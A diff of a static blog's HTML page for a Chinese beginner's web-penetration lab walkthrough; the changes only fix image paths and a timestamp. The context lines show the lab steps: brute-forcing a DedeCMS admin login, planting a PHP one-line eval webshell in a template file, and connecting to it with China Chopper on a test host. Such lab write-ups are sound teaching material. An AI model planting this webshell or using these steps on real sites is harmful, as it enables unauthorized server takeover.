@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/7.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/8.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/9.png">
-<meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/home/showmeshell/Desktop/10.png">
+<meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/10.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/11.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/12.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/13.png">
@@ -40,7 +40,7 @@
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/22.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/23.png">
 <meta property="og:image" content="http://showmeshell.top/2018/10/12/web渗透入门之-真的很简单/24.png">
-<meta property="og:updated_time" content="2018-10-12T08:14:18.819Z">
+<meta property="og:updated_time" content="2018-10-14T03:44:39.331Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="web渗透入门之-真的很简单">
 <meta name="twitter:description" content="0x01 网站管理员的密码是多少？在实验环境内根据提示打开下载链接 http://file.ichunqiu.com/49ba59ab，接着下载爆破工具 dedecms.exe：  打开工具，输入目标 URL，一键爆破得到管理员的账号 ichunqiu 与密码哈希值 adab29e084ff095ce3eb：  仔细数数，发现密码哈希值是 20 位的（注：此处的“位”均为十六进制，而非二进制），上">
@@ -222,7 +222,7 @@
 <h3 id="直接修改模板-PHP-源码"><a href="#直接修改模板-PHP-源码" class="headerlink" title="直接修改模板 PHP 源码"></a>直接修改模板 PHP 源码</h3><p>依次点击 <strong>模板 -&gt; 标签源码管理</strong>，以编辑第一个模板 <code>adminname.lib.php</code> 为例：</p>
 <p><img src="/2018/10/12/web渗透入门之-真的很简单/9.png" alt="template_list"></p>
 <p>在模板源码第一行插入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/home/showmeshell/Desktop/10.png" alt="template_edit"></p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/10.png" alt="template_edit"></p>
 <p>接着在工具箱【webshell】文件夹打开【中国菜刀】：</p>
 <p><img src="/2018/10/12/web渗透入门之-真的很简单/11.png" alt="chopper"></p>
 <p>在 <strong>添加SHELL</strong> 输入框中，输入被插入木马模板文件的地址 <code>http://www.test.ichunqiu/include/taglib/adminname.lib.php</code>，其右侧填入木马中接收 POST 请求数据的 key 字段 <code>cmd</code>，脚本类型为 <code>PHP(Eval)</code>，字符编码为 <code>GB2312</code>，设置完成后点击 <strong>添加</strong>：</p>
